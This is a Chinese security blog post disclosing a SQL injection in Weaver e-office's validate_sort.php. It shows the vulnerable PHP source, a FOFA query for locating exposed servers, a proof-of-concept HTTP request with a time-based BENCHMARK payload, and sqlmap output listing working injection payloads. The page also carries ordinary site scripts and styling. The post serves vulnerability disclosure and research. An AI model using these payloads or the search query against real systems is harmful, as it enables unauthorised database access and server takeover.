---
title: "泛微e-office validate_sort.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-officeitem-sort-validate_sort-sqli.html
asset_dir: assets/泛微e-office-validate_sort.php-sql注入漏洞
---

# 泛微e-office validate\_sort.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/12 18:25
* 810浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

物流软件安全

技术文章订阅

防火墙软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office validate\_sort.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

代码安全审计

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/officeitem/sort/validate\_sort.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
$connection = openconnection( );
if ( $_REQUEST['sort_id'] != NULL )
{
    $query = "select SORT_ID from officeitem_sort where SORT='".$sort."' and SORT_ID !=".$_REQUEST['sort_id'];
}
else
{
    $query = "select SORT_ID from officeitem_sort where SORT='".$sort."'";
}
$cursor = exequery( $connection, $query );
if ( $row = mysql_fetch_row( $cursor ) )
{
    echo "1";
}
?>
```

深入探索

文件大小转换

安全

安全运维咨询

`sort_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/officeitem/sort/validate_sort.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: sort_id=1 AND 4225=BENCHMARK(5000000,MD5(0x4567684e))
```

[![泛微e-office validate_sort.php sql注入漏洞](images/img-001-32353a106474.webp)](https://image.mrxn.net/f2a4b28b5b67402ebe35c1cdc3766091.webp)

成功延时 5 秒

漏洞扫描服务

深入探索

漏洞修复方案

企业安全咨询

Windows安全工具

[sqlmap](https://mrxn.net/tag/sqlmap "sqlmap") 结果如下

```
sqlmap identified the following injection point(s) with a total of 458 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://eoffice.mrxn.net:8082/general/officeitem/sort/validate_sort.php?sort_id=1 RLIKE (SELECT (CASE WHEN (5684=5684) THEN 1 ELSE 0x28 END))

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: http://eoffice.mrxn.net:8082/general/officeitem/sort/validate_sort.php?sort_id=1 AND 4225=BENCHMARK(5000000,MD5(0x4567684e))
---
```

validate\_number.php 也存在同样的问题。

* 标签：
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#sqlmap](https://mrxn.net/tag/sqlmap)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office validate\_sort.php sql注入漏洞](https://mrxn.net/jswz/eoffice-general-officeitem-sort-validate_sort-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-general-officeitem-sort-validate_sort-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-officeitem-sort-validate\_sort-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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